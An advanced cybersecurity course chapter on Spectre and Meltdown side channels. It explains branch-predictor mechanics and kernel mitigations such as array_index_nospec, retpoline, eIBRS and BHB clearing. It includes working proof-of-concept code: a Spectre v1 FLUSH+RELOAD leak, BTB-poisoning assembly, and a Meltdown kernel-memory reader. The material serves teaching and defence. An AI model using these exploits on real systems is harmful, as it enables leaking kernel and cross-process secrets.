---
corso: "Cybersecurity Masterclass"
fase: "Domain 7 — Side Channels & Hardware"
modulo: "7.1"
titolo: "Spectre Variants and Microarchitectural Side Channels"
versione: "Intel 9th–15th gen, AMD Zen 1–5, ARMv8-A/v9-A, Linux 6.x, eIBRS, BHI_DIS_S, CET-IBT"
livello: "Advanced"
prerequisiti:
  - "Domain 2, Chapter 2A §10 — Page tables, KPTI, PCID"
  - "Domain 2, Chapter 2B §1 — Syscall dispatch"
  - "Domain 5, Chapter 5A §7 — SMEP/SMAP, KASLR"
  - "Understanding of CPU pipelining, out-of-order execution, and branch prediction"
  - "Familiarity with x86 assembly and timing primitives (rdtsc/rdtscp)"
obiettivi:
  - "Implement a Spectre v1 bounds-check-bypass PoC with FLUSH+RELOAD cache side-channel recovery"
  - "Analyze BTB/BHB/RSB poisoning mechanisms and evaluate retpoline, IBRS, eIBRS, and BHI_DIS_S mitigations"
  - "Construct PRIME+PROBE eviction sets and measure LLC slice-hash functions for cross-core cache attacks"
  - "Quantify the speculative execution window for a given microarchitecture and assess gadget reachability"
  - "Evaluate the 2025 Training Solo and Branch Privilege Injection attacks (CVE-2024-28956, CVE-2024-45332) against current mitigations"
tag: [security, spectre, meltdown, side-channel, cache-timing, FLUSH-RELOAD, PRIME-PROBE, retpoline, IBRS, eIBRS, BHI, KPTI, speculative-execution, TLBleed, branch-predictor]
---

# Domain 7, Chapter 7A — Spectre Variants and Microarchitectural Side Channels

> **Learning objectives.** After completing this chapter you will be able to: (1) compile and run a Spectre v1 bounds-check-bypass PoC, tuning `CACHE_HIT_THRESHOLD` per microarchitecture and measuring leak bandwidth; (2) explain the microarchitectural root cause of each Spectre variant (PHT, BTB, RSB, BHB, store buffer) and map each to its primary mitigation (lfence, retpoline, IBRS, eIBRS, SSBD, RSB stuffing, BHI_DIS_S); (3) construct a PRIME+PROBE eviction set for the LLC using the group-testing algorithm and verify it via timing measurement; (4) evaluate the 2025 Training Solo (CVE-2024-28956) and Branch Privilege Injection (CVE-2024-45332) attacks and determine whether a given kernel configuration is vulnerable; (5) audit a kernel code path for Spectre v1 gadgets using `array_index_nospec` placement analysis and assess residual speculative-execution risk.

> **Scope.** Spectre v1 (bounds check bypass), v2 (branch target injection), v3 (Meltdown), v3a (rogue system register read), v4 (speculative store bypass), Spectre-BTB, Spectre-RSB, Spectre-STL, Spectre-PHT, Spectre-BHB. Mitigations: `array_index_mask_nospec`, `lfence`, retpoline, IBRS/IBPB/STIBP/eIBRS, KPTI, SSBD, RSB stuffing, SLH, CET-IBT/SHSTK. Microarchitectural side channels: cache-based (PRIME+PROBE, FLUSH+RELOAD, EVICT+RELOAD, FLUSH+FLUSH), cache coherence protocols, `clflush`/`clflushopt`/`clwb`, TLB side channels (TLBleed), branch predictor side channels (BranchScope), `prefetch`-based probing, AVX register timing, `rdtsc`/`rdtscp` timing, port contention, memory bus contention, interrupt timing.
>
> **Prerequisites.** Domain 2 Chapter 2A §10 (page tables, KPTI, PCID), Domain 2 Chapter 2B §1 (syscall dispatch), Domain 5 Chapter 5A §7 (SMEP/SMAP, KASLR). Basic understanding of CPU pipelining and out-of-order execution.

---

## 1. The speculative execution model

Modern CPUs execute instructions speculatively: when the CPU encounters a branch whose outcome is not yet known, it predicts the outcome (using branch prediction hardware), begins executing the predicted path, and retires the results if the prediction was correct. If incorrect, the CPU "squashes" the speculative work, rolling back the architectural state (registers, memory) as if the speculative instructions never executed.

The fundamental insight behind all Spectre-class attacks: while the architectural state is rolled back on misprediction, the **microarchitectural state** — cache contents, TLB entries, branch predictor state, execution-unit contention — is not rolled back. Speculative instructions that access memory leave cache-line footprints that persist after the squash. An attacker who can observe these microarchitectural traces (via timing measurements) can infer what data the speculative instructions accessed.

The attack pattern: (1) train the branch predictor to mispredict, (2) the CPU speculatively executes instructions that access secret data and encode it into microarchitectural state, (3) the misprediction is detected and the architectural state is rolled back, (4) the attacker reads the microarchitectural state (via a side channel) to recover the secret.

### 1.1 Branch prediction hardware

Modern out-of-order processors rely on several prediction structures that collectively determine the speculative path:

**Branch Predictor Unit (BPU).** The front-end component that predicts the direction and target of every branch before it is decoded. The BPU typically contains the structures described below.

**Pattern History Table (PHT).** Records the taken/not-taken history of conditional branches. The PHT is indexed by a combination of the branch's instruction pointer (or a hash thereof) and a global branch history register (GHR) that records the outcomes of the last N branches. A two-bit saturating counter at each PHT entry records whether the branch is predicted taken or not-taken. The PHT's dimensions (number of entries, history depth) vary by microarchitecture; Intel Skylake uses a 4096-entry PHT with a 30-bit global history.

**Branch Target Buffer (BTB).** Caches the target addresses of indirect branches (`call [reg]`, `jmp [reg]`). Indexed by the branch's instruction pointer. When an indirect branch is encountered, the BTB provides the predicted target address so the front end can begin fetching from that target speculatively. The BTB typically has 4096-8192 entries on modern Intel cores, organized as a set-associative structure.

**Return Stack Buffer (RSB).** A small stack (typically 16-32 entries on Intel, 32 entries on AMD Zen) that predicts `ret` targets. On every `call`, the RSB pushes the return address (the instruction after the `call`). On every `ret`, the RSB pops and predicts that as the return target. This LIFO structure accurately predicts return addresses for well-structured call/return pairs. When the RSB underflows (more returns than calls, or the RSB is exhausted by deep call chains), behavior varies by microarchitecture: some fall back to the BTB, others use an alternate predictor.

**Branch History Buffer (BHB).** Records the recent global branch history — a shift register of the last 29 (Intel) or 194+ (some AMD) branch outcomes. This history is fed into the BTB lookup function to improve indirect-branch prediction accuracy by correlating the predicted target with the execution path that led to the branch. The BHB is central to the Spectre-BHB attack (CVE-2022-0001).

**Speculative execution window.** The number of instructions that can execute speculatively before a misprediction is detected is bounded by the reorder buffer (ROB) depth. On Skylake, the ROB holds 224 micro-ops; on Golden Cove (Alder Lake), 512 micro-ops. A larger ROB means a wider speculation window: more speculative instructions can execute (and encode secrets into microarchitectural state) before the misprediction is resolved. An attacker who can delay the resolution of the mispredicting branch (e.g., by forcing a cache miss on the branch condition) maximizes the speculation window.

**Maximizing the speculation window — attacker technique.** The attacker evicts the branch-condition variable from all cache levels (using `clflush` or by constructing a conflicting eviction set). When the CPU encounters the branch, it must fetch the condition from DRAM (~200-400 cycles). During this window the CPU speculatively executes hundreds of instructions along the predicted path. A 300-cycle window on a 4-wide superscalar pipeline can execute approximately 1200 micro-ops speculatively — more than enough to perform a secret-dependent memory access and a second-order transmission load. This is why the interplay between cache hierarchy and branch resolution latency is central to Spectre exploitation: the attacker controls the window width by controlling the cache residency of the branch condition.

**Micro-op cache (DSB) interaction.** The micro-op cache (Decoded Stream Buffer) stores decoded micro-ops, bypassing the front-end decode stage for hot code. Speculative execution from the DSB is faster (no decode latency), widening the effective speculation window for code paths that are hot in the micro-op cache. An attacker who primes the victim's gadget path to be DSB-resident (by triggering repeated execution) gains additional speculative throughput. Conversely, cold code paths that miss the DSB and require full decode have a narrower window.

---

## 2. Spectre v1 — Bounds check bypass (CVE-2017-5753)

### 2.1 Mechanism

The attacker trains the conditional branch predictor so that a bounds check (e.g., `if (x < array_size)`) is predicted as taken, then provides an out-of-bounds value for `x`. The CPU speculatively executes the array access with the out-of-bounds index, reads secret data from beyond the array boundary, and uses that data in a subsequent dependent load (a "gadget") that encodes the secret into cache state.

The canonical gadget:

```c
if (x < array1_size) {                 // mispredicted as true
    y = array2[array1[x] * 4096];      // speculative out-of-bounds read
}
```

`array1[x]` reads a secret byte (out of bounds). `array2[secret * 4096]` loads a cache line dependent on the secret value. After misprediction rollback, the attacker probes `array2` to determine which cache line was loaded (via FLUSH+RELOAD or PRIME+PROBE), recovering the secret byte.

The PHT training works because the PHT entry for the bounds-check branch is indexed by a hash of the branch address and recent branch history. The attacker invokes the bounds check repeatedly with in-bounds values, saturating the PHT counter to "taken." When the attacker then supplies an out-of-bounds value, the PHT still predicts "taken" and the CPU speculatively enters the body, executing the out-of-bounds access before the comparison with `array1_size` resolves (especially if `array1_size` is not in cache, introducing a resolution delay of 200+ cycles).

### 2.2 Complete PoC in C

The following proof-of-concept demonstrates Spectre v1 bounds-check bypass with FLUSH+RELOAD timing recovery. This code is derived from the original Spectre paper's reference implementation (Kocher et al., January 2018):

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>   /* for __rdtscp, _mm_clflush */

#define CACHE_HIT_THRESHOLD 80  /* cycles; tune per CPU */

unsigned int array1_size = 16;
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t array2[256 * 512];  /* probe array, 512-byte stride to span cache lines */

char *secret = "Spectre v1 secret data leaking via cache side channel";

uint8_t temp = 0; /* prevent dead-code elimination */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

void read_byte(size_t malicious_x, uint8_t *value, int *score) {
    static int results[256];
    int tries, i, j, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    volatile uint8_t *addr;
    unsigned int time1, time2;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = 0; tries < 999; tries++) {
        /* flush array2 from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        /* flush array1_size from cache to widen speculation window */
        _mm_clflush(&array1_size);
        _mm_mfence();

        /* 30 calls: 5 training (in-bounds), 1 malicious, repeat */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            /* delay to ensure cache flush completes */
            for (volatile int z = 0; z < 100; z++) {}
            /* bit trick: x = training_x when j%6!=0, malicious_x when j%6==0 */
            x = ((j % 6) - 1) & ~0xFFFF;      /* 0 if j%6==0, nonzero otherwise */
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));
            victim_function(x);
        }

        /* time array2 access to find cached entry */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;  /* randomize probe order */
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
                results[mix_i]++;
        }

        j = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] > results[j]) j = i;
        }
        if (results[j] >= (3 * tries / 256)) break;
    }
    *value = (uint8_t)j;
    *score = results[j];
}

int main(void) {
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int score, len = strlen(secret);
    uint8_t value;

    printf("Reading %d bytes starting at offset %p:\n", len, (void *)malicious_x);
    for (int i = 0; i < len; i++) {
        read_byte(malicious_x + i, &value, &score);
        printf("0x%02X='%c' score=%d\n", value, (value > 31 && value < 127) ? value : '?', score);
    }
    return 0;
}
```

Compile with `gcc -O1 -march=native -o spectre_v1 spectre_v1.c`. The `-O1` is deliberate: higher optimization may elide the speculative gadget or reorder operations that defeat the timing measurement. The `CACHE_HIT_THRESHOLD` must be tuned per CPU microarchitecture (typically 60-100 cycles for Intel Skylake through Raptor Lake).

### 2.3 Gadget identification in kernel code

A Spectre v1 gadget in kernel code requires three ingredients: (1) a conditional bounds check on an attacker-controlled index, (2) an array access using that index within the predicted-taken path, and (3) a second dependent memory access that encodes the read value into cache state (the "transmission" step). The Linux kernel's static analysis tooling and manual audit identified hundreds of such patterns, particularly in:

- **`copy_from_user`/`get_user` paths** where a user-supplied index is checked against an array size and then used to index a kernel array.
- **Syscall dispatch tables** where the syscall number (user-controlled) indexes into a function pointer array after a bounds check.
- **eBPF programs** where the verifier ensures bounds at the architectural level but the speculative path may bypass those bounds.
- **Networking subsystem** where packet-header fields index into protocol tables.

The automated tool `smatch` (a static analysis framework for the kernel) was extended with Spectre v1 gadget detection. Additionally, the Spectre v1 scanning tool in `scripts/check_spectre` and compiler plugins like the GCC `-Warray-bounds` flag (in conjunction with manual annotation) help identify vulnerable patterns. However, automated detection has high false-positive rates because it cannot model the full PHT training context — many flagged patterns are not exploitable in practice because the attacker lacks the ability to train the PHT for that specific branch.

### 2.4 Mitigations

**`array_index_nospec(index, size)`.** Defined in `include/linux/nospec.h`. The implementation on x86:

```c
#define array_index_mask_nospec(index, size)                \
({                                                          \
    typeof(index) _i = (index);                             \
    typeof(size) _s = (size);                               \
    unsigned long _mask = array_index_mask_nospec_asm(_i, _s); \
    BUILD_BUG_ON(sizeof(_i) > sizeof(long));                \
    BUILD_BUG_ON(sizeof(_s) > sizeof(long));                \
    (typeof(_i)) (_i & _mask);                              \
})
```

The assembly-level implementation uses a `cmp` + `sbb` sequence that produces a mask without a branch:

```asm
; RDI = index, RSI = size
cmp     rdi, rsi       ; sets CF if index < size
sbb     rax, rax       ; RAX = 0 if index >= size, -1 (all ones) if index < size
and     rax, rdi       ; result = index & mask
```

Because `sbb` is a data-dependent instruction (not a branch), the CPU does not speculate on its outcome. The result is always zero when the index is out of bounds, even during speculative execution. This is the preferred mitigation because it has near-zero performance cost (a single `cmp`+`sbb`+`and` sequence vs. the original bounds check).

**`lfence` serialization.** An `lfence` instruction after the bounds check serializes execution: the CPU does not speculatively execute past the `lfence` until the bounds check has retired. This closes the speculation window but has a performance cost (it stalls the pipeline for tens of cycles). The kernel uses `lfence` where `array_index_nospec` is not applicable (e.g., when the gadget involves a pointer dereference rather than array indexing). The `barrier_nospec()` macro provides the architecture-specific serialization barrier.

**Compiler mitigations.** Clang's `-mspeculative-load-hardening` (Speculative Load Hardening, SLH) inserts data-dependent masking after every conditional branch, ensuring that speculative loads cannot use values derived from mispredicted conditions. SLH is comprehensive but expensive: 10-30% overhead on microbenchmarks due to the pervasive masking. The kernel does not use SLH globally but relies on targeted `array_index_nospec` placement. GCC does not implement SLH as of GCC 14; instead, it provides `-mindirect-branch=thunk` (retpoline) and relies on kernel-level nospec annotations.

### 2.5 Affected processors and real-world impact

CVE-2017-5753 affects virtually every modern CPU with speculative execution of conditional branches: Intel (all Core/Xeon families from at least Nehalem onward), AMD (Bulldozer, Zen, Zen 2, Zen 3, Zen 4), ARM (Cortex-A15, A53, A55, A57, A72, A73, A75, A76, A77, A78, X1, X2, Neoverse N1, N2, V1). RISC-V implementations with branch prediction are also theoretically vulnerable, though no demonstrated exploitation exists as of this writing.

The practical exploitation bar for Spectre v1 is moderate: the attacker needs a suitable gadget in the victim code, the ability to train the PHT (which typically requires repeated invocation of the victim function), and a timing side channel. In the kernel context, eBPF has been the most prominent attack surface: unprivileged eBPF programs could be crafted to speculatively bypass verifier-imposed bounds checks, reading arbitrary kernel memory. This led to the default disabling of unprivileged eBPF (`sysctl kernel.unprivileged_bpf_disabled=1`) on most distributions.

Beyond eBPF, Spectre v1 gadgets have been identified in the Linux networking stack (e.g., the socket option handling in `net/core/sock.c` where user-supplied option numbers index into arrays), the `/dev/kvm` interface (where guest-controlled values index into host kernel structures), and the USB subsystem (where device-reported descriptors index into driver arrays). Each required targeted placement of `array_index_nospec()`. The kernel commit log contains over 200 individual Spectre v1 fixes across subsystems, illustrating the pervasiveness of this gadget pattern in any codebase that indexes arrays by user-controlled values.

The Chrome V8 JavaScript engine was another high-profile target: JIT-compiled JavaScript can construct Spectre v1 gadgets by arranging bounds-checked array accesses in a tight loop. Google's mitigation was twofold: (1) site isolation (placing each origin in a separate renderer process so speculative reads cannot cross origin boundaries), and (2) reducing timer resolution in `performance.now()` to make cache timing unreliable from JavaScript. Firefox and Safari adopted similar measures.

The eBPF attack path deserves special attention because it was the most practical in-the-wild Spectre v1 vector on Linux. Prior to the mitigation, an unprivileged user could load a BPF program via `bpf(BPF_PROG_LOAD, ...)`. The verifier checked that all array accesses were within bounds at the architectural level, but the speculative path could bypass the verifier-inserted bounds checks. The BPF JIT compiler emitted native x86 code that included the bounds check as a conditional branch — and this branch was subject to PHT training by the attacker. The fix was multi-layered: (1) disabling unprivileged BPF by default (`kernel.unprivileged_bpf_disabled=1`), (2) inserting `lfence` after bounds checks in JIT-compiled BPF programs, (3) using `array_index_nospec()` within the BPF map lookup paths, and (4) adding speculative-execution-aware verification in the BPF verifier that tracks which values may be "speculatively unbounded" and inserts masking operations accordingly.

---

## 3. Spectre v2 — Branch target injection (CVE-2017-5715)

### 3.1 Mechanism

The attacker poisons the **indirect branch predictor** (the BTB — Branch Target Buffer) so that an indirect branch (`jmp [rax]`, `call [rax]`, `ret`) in the victim context (kernel, hypervisor, or another process) is predicted to jump to an attacker-chosen target address. The CPU speculatively executes at the attacker's target, which is a gadget in the victim's address space that reads secret data and encodes it into cache state.

The key difference from v1: v1 exploits conditional branch misprediction; v2 exploits indirect branch target misprediction. V2 allows the attacker to redirect speculation to an arbitrary code location (within the victim's address space), making the gadget space much larger.

### 3.2 BTB poisoning mechanism

The BTB is indexed by a hash of the branch instruction's virtual address. On Intel CPUs prior to eIBRS, the BTB is shared across privilege levels: a user-space branch at virtual address V poisons the same BTB entry as a kernel branch at the same virtual address V. The attacker:

1. Identifies an indirect branch in the kernel at virtual address V (using KASLR bypass techniques or by scanning known kernel images for indirect-branch patterns).
2. Maps code at the same virtual address V in user space.
3. Trains the BTB by repeatedly executing an indirect branch at address V in user space, targeting a chosen gadget address G in the kernel.
4. Triggers a transition into the kernel (syscall, interrupt).
5. When the kernel executes its indirect branch at address V, the BTB predicts the target as G (the attacker's trained target).
6. The CPU speculatively executes the gadget at G in the kernel's address space, which reads secret data and encodes it into cache state.

The BTB aliasing is the linchpin: because both the attacker's and the victim's branches hash to the same BTB entry, the attacker's training pollutes the victim's prediction. On some microarchitectures, partial-tag matching in the BTB means that even branches at different virtual addresses can alias if they share enough address bits in the BTB index hash.

A minimal BTB training sequence in assembly:

```asm
; Attacker user-space code at virtual address matching victim's branch
; Train BTB to predict target = gadget_addr
    lea     rax, [gadget_addr]      ; desired speculative target
    mov     [train_buf], rax
.train_loop:
    ; Execute indirect branch at the aliasing address
    jmp     [train_buf]             ; trains BTB: this address -> gadget_addr
gadget_addr:
    ; Training lands here; architecturally harmless in attacker's space
    dec     ecx
    jnz     .train_loop
    ; After training, trigger kernel entry (syscall)
    ; Kernel's indirect branch at same VA will be predicted -> gadget_addr
```

The training must be executed thousands of times (2000-5000 iterations) to saturate the BTB's saturating counter and override any existing prediction for the target address. The training frequency depends on the BTB's replacement policy and tag-matching width.

### 3.3 Retpoline

A software construct that replaces indirect branches with a sequence that never falls through to a speculative target. The canonical retpoline for `jmp *%rax`:

```asm
__x86_indirect_thunk_rax:
    call    .Lretpoline_target
.Lspeculation_trap:
    lfence
    jmp     .Lspeculation_trap      ; infinite loop (never executed architecturally)
.Lretpoline_target:
    mov     [rsp], rax              ; overwrite return address with actual target
    ret                             ; return to actual target
```

The `call` pushes `.Lspeculation_trap` as the return address. The `ret` speculatively predicts a return to `.Lspeculation_trap` (which is an infinite loop — the speculative execution is trapped). Architecturally, the `mov [rsp], rax` overwrites the return address with the actual target, and `ret` returns there.

Retpoline is effective against BTB-based Spectre v2 because the indirect branch is replaced with a `ret`, and the RSB (Return Stack Buffer) predicts the return to the trap loop rather than the attacker's injected target. However, retpoline has performance costs (the call/ret/mov sequence is slower than a direct indirect branch). Benchmarks show 2-10% overhead on system-call-heavy workloads and up to 14% on workloads with frequent indirect branches (e.g., virtual method dispatch in C++ codebases running in the kernel or in QEMU/KVM).

The GCC flag is `-mindirect-branch=thunk`, which causes all indirect calls and jumps to go through the retpoline thunk. Clang uses `-mretpoline`. The kernel build system sets these flags automatically when `CONFIG_RETPOLINE=y`.

### 3.4 IBRS, IBPB, STIBP, eIBRS

**IBRS (Indirect Branch Restricted Speculation).** A CPU microcode feature that restricts indirect branch predictions: when IBRS is set (MSR `IA32_SPEC_CTRL` bit 0), indirect branches in a higher-privilege context are not predicted based on branches executed in a lower-privilege context. This prevents user-to-kernel and guest-to-host branch-target injection. Setting IBRS on every kernel entry (syscall, interrupt) and clearing it on exit incurs measurable overhead (the MSR write is serializing, costing 100-200 cycles on Skylake).

**IBPB (Indirect Branch Prediction Barrier).** A command to the CPU (write to MSR `IA32_PRED_CMD` bit 0) to flush the entire indirect branch predictor state. Issued on context switches (when switching between processes, or between user and kernel mode in sensitive scenarios) to prevent one context's training from affecting another's. Performance cost: the predictor must be retrained after each flush, causing a burst of mispredictions (a "cold predictor" penalty lasting hundreds to thousands of cycles). The kernel issues IBPB selectively: on transitions between processes with different ASID (when `ALWAYS_IBPB` or `COND_IBPB` is set per task), not on every context switch.

**STIBP (Single Thread Indirect Branch Predictor).** Restricts indirect branch prediction sharing between hardware threads (hyper-threads) on the same core. Without STIBP, one hyper-thread's branch training can influence the other's predictions, enabling cross-thread Spectre v2. STIBP is controlled via MSR `IA32_SPEC_CTRL` bit 1. The kernel enables STIBP for processes running on SMT siblings when the threat model requires cross-thread isolation. The performance impact is significant for workloads that benefit from shared BTB state (up to 30% regression on some microbenchmarks).

**eIBRS (Enhanced IBRS).** Available on newer Intel CPUs (Ice Lake+, Tiger Lake+, and Cascade Lake with microcode update). Provides IBRS protection without the need for retpolines, with lower performance overhead. The CPU automatically restricts cross-privilege prediction without software intervention on each branch: once eIBRS is enabled via the MSR, all indirect branches executed at a higher privilege level are isolated from lower-privilege training, and the isolation persists without re-setting the MSR on each entry. When eIBRS is available, the kernel can disable retpolines (the kernel prints `Spectre v2 : Mitigation: Enhanced IBRS` in dmesg). The performance overhead of eIBRS is near-zero on microarchitectures that implement it natively.

### 3.5 Spectre-RSB: Return Stack Buffer poisoning

The RSB predicts `ret` targets based on the corresponding `call` stack. SpectreRSB (Koruyeh et al., 2018) demonstrated that an attacker can manipulate the RSB to redirect speculative execution of a `ret` instruction to an attacker-chosen target. The attack vectors:

- **RSB underflow.** If the RSB is exhausted (more `ret`s than `call`s — e.g., the kernel's context-switch path drains RSB entries pushed by user-space `call` instructions), the CPU falls back to the BTB for return prediction, which can be attacker-trained.
- **RSB poisoning across context switches.** User-space `call` instructions push entries into the RSB. On context switch to the kernel, those RSB entries persist. A `ret` in the kernel may speculatively use a user-poisoned RSB entry.

**RSB stuffing** is the mitigation: on context switches and VM exits, the kernel fills the RSB with safe entries (typically the `lfence; jmp` speculation trap). The kernel macro `FILL_RETURN_BUFFER` performs this by executing 16 or 32 `call` instructions (one per RSB entry) that push the trap address. After stuffing, all RSB entries point to the safe trap, preventing speculative redirection.

On CPUs with eIBRS, RSB-based misprediction is less of a concern because the enhanced indirect-branch restrictions also cover return prediction. However, RSB stuffing remains as defense-in-depth.

### 3.6 Spectre-BHB: Branch History Buffer injection (CVE-2022-0001, CVE-2022-0002)

In March 2022, VUSec researchers demonstrated that eIBRS can be bypassed by injecting chosen branch history into the BHB (Branch History Buffer). The BHB feeds into the BTB lookup function: the BTB uses both the branch address and the BHB contents to select the predicted target. Even with eIBRS preventing direct cross-privilege BTB poisoning, an attacker can execute a specific sequence of branches in user space that sets the BHB to a known state, then trigger a kernel entry. When the kernel executes an indirect branch, the BTB lookup uses the attacker-controlled BHB state, potentially selecting a target that the attacker influenced through BHB collision.

The attack works because eIBRS does not partition the BHB across privilege levels — the BHB is a shared shift register that records branch outcomes regardless of privilege. The attacker crafts a "BHB history" (a sequence of taken/not-taken branches) that, when combined with a kernel indirect branch address, hashes to a BTB entry containing an attacker-favorable target.

CVE-2022-0001 addresses intra-mode BTI (Branch Target Injection via BHB within the same privilege level). CVE-2022-0002 addresses unprivileged user-to-kernel BTI via BHB. The practical exploitation requires knowledge of the kernel's indirect branch locations and the BTB hash function, but the VUSec proof-of-concept demonstrated reliable kernel-memory reads on Intel Alder Lake and ARM Cortex-A76 and above.

**Mitigations.** Intel issued microcode adding a new feature, BHI_DIS_S (MSR bit), that prevents user-mode branch history from influencing kernel-mode indirect branch predictions. The kernel clears the BHB on privilege transitions using a software sequence of branches (a "BHB clear sequence" of 194 dummy branches for Intel, corresponding to the BHB depth). ARM mitigations use the `CLEARBHB` instruction (ARMv8.9-A) or firmware-based CSV2_3 support. The Linux kernel's `spectre_bhi` boot parameter controls the mitigation (`on`, `off`, `auto`).

### 3.7 Real-world kernel exploitation scenario

A concrete cross-privilege Spectre v2 attack against the Linux kernel:

1. The attacker identifies an indirect `call` instruction in the kernel's syscall dispatch path (e.g., `call *sys_call_table[nr]`) or in a performance-critical path like the VFS lookup (which uses indirect calls through function pointers in `struct file_operations`).
2. The attacker locates a useful gadget in the kernel — a code sequence that loads a secret value into a register and uses it to index a memory access. Gadgets are plentiful in a codebase the size of the Linux kernel; common patterns include hash-table lookups, dispatch tables, and buffer-copy routines.
3. From user space, the attacker trains the BTB by executing indirect branches at aliasing virtual addresses, targeting the gadget address.
4. The attacker triggers a syscall. The kernel's indirect branch is mispredicted to the gadget, which speculatively reads kernel memory and encodes it into the attacker's probe array.
5. After the syscall returns, the attacker probes the side channel to recover the leaked bytes.

This attack was demonstrated by the original Spectre v2 researchers (Kocher et al.) reading kernel memory at ~2000 bytes/second on a Skylake-era CPU without mitigations.

A real-world Spectre v2 exploit against KVM was demonstrated by Google Project Zero in 2018: the attacker VM trained the BTB from guest user space to redirect the host hypervisor's indirect branches during VM exit handling, reading host kernel memory. This crossed the guest-to-host isolation boundary — the strongest isolation guarantee in cloud computing — forcing all major cloud providers to deploy emergency microcode updates and retpoline-patched hypervisors within weeks of disclosure.

---

## 4. Spectre v3 — Meltdown (CVE-2017-5754)

### 4.1 Mechanism

Meltdown exploits a different property: **exception suppression during speculation**. On vulnerable CPUs (primarily Intel pre-Ice Lake and some ARM Cortex-A75), a load from kernel memory in user mode does not immediately fault. Instead, the load completes speculatively (reading the kernel data), and the fault is raised when the instruction retires. The speculative instructions that follow the load can encode the kernel data into cache state before the fault is delivered.

Meltdown is more powerful than Spectre v1/v2: it directly reads kernel memory from user space, without needing a gadget in the victim context. The attacker's code itself performs the read and encoding.

The CPU's memory management unit (MMU) checks permissions when the load retires, not when it dispatches. During out-of-order execution, the load micro-op is dispatched to the load port, which begins the page-table walk. On vulnerable processors, even when the page-table entry indicates supervisor-only access, the load unit still returns the data to the reorder buffer for use by dependent micro-ops. The permission fault is recorded but only acted upon at retirement. The speculative window between dispatch and retirement (hundreds of cycles on modern CPUs) is sufficient for dependent operations to encode the data into cache state.

At the pipeline level, the sequence is:

1. The load micro-op enters the load queue. The address generation unit computes the linear address from the base register and displacement.
2. The TLB is consulted. If the translation is cached, the physical address and permission bits are available immediately. If not, a page-table walk is initiated (adding 100+ cycles of latency).
3. On a TLB hit, the physical address is sent to the L1D cache. Simultaneously, the permission bits are forwarded to the retirement unit for checking.
4. **The critical design flaw on vulnerable CPUs:** the L1D returns the data to the load queue without waiting for the permission check to complete. The data is forwarded to dependent micro-ops in the reorder buffer.
5. Dependent micro-ops (e.g., a shift, an add, and a second load using the first load's value as an address component) execute immediately using the forwarded data.
6. When the load reaches the retirement stage, the permission check result is available. The retirement logic detects the supervisor-mode violation and raises a page fault (#PF). The reorder buffer is flushed: all micro-ops after the faulting load are discarded, and their architectural effects are rolled back.
7. However, the second load (step 5) has already accessed the cache at an address derived from the kernel data, bringing that cache line into the L1D. This microarchitectural effect is not rolled back.

AMD processors handle step 4 differently: they check the permission bits before forwarding the data, and if the check fails, they forward zero (or the previous load's value) rather than the actual data. This architectural design choice is why AMD CPUs are immune to Meltdown-US.

The implication for microarchitecture security is profound: the order in which the pipeline checks permissions versus forwards data determines whether an entire class of attacks is possible. Intel's choice to prioritize performance (forwarding data before the permission check completes, allowing dependent micro-ops to begin execution immediately) created a multi-billion-dollar vulnerability that affected every Intel CPU shipped for over a decade. AMD's choice to prioritize correctness (blocking the data forwarding until the permission check passes) incurred a small latency penalty (estimated at 1-3 cycles on the critical load-to-use path) but eliminated the Meltdown attack surface entirely.

### 4.2 PoC: reading kernel memory via Meltdown

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80
#define PROBE_STRIDE 4096

static uint8_t probe_array[256 * PROBE_STRIDE];
static jmp_buf jmp_env;

static void segfault_handler(int sig) {
    (void)sig;
    longjmp(jmp_env, 1);
}

static inline int flush_reload(uint8_t *addr) {
    unsigned int junk;
    uint64_t t = __rdtscp(&junk);
    (void)*addr;
    t = __rdtscp(&junk) - t;
    return (int)t;
}

int meltdown_read_byte(uintptr_t kernel_addr) {
    int results[256] = {0};

    for (int attempt = 0; attempt < 1000; attempt++) {
        /* flush probe array */
        for (int i = 0; i < 256; i++)
            _mm_clflush(&probe_array[i * PROBE_STRIDE]);
        _mm_mfence();

        if (setjmp(jmp_env) == 0) {
            /* the faulting read: access kernel address */
            /* the compiler must not optimize this away */
            uint8_t val;
            asm volatile(
                "xorq %%rax, %%rax\n"
                "retry:\n"
                "movb (%[addr]), %%al\n"       /* faulting load */
                "shlq $12, %%rax\n"            /* multiply by 4096 */
                "jz retry\n"                   /* retry if zero (transient) */
                "movq (%[probe], %%rax, 1), %%rbx\n"  /* encode in cache */
                : : [addr] "r" (kernel_addr),
                    [probe] "r" (probe_array)
                : "rax", "rbx"
            );
        }
        /* control returns here after SIGSEGV via longjmp */

        /* probe */
        for (int i = 1; i < 256; i++) {
            int t = flush_reload(&probe_array[i * PROBE_STRIDE]);
            if (t < CACHE_HIT_THRESHOLD) results[i]++;
        }
    }
    int best = 0;
    for (int i = 1; i < 256; i++)
        if (results[i] > results[best]) best = i;
    return best;
}

int main(void) {
    signal(SIGSEGV, segfault_handler);
    memset(probe_array, 0, sizeof(probe_array));
    /* Target: read byte at a kernel virtual address */
    /* On an unpatched kernel, use e.g. 0xffffffff81000000 */
    uintptr_t target = 0xffffffff81000000;
    int val = meltdown_read_byte(target);
    printf("Read byte at %p: 0x%02x\n", (void *)target, val);
    return 0;
}
```

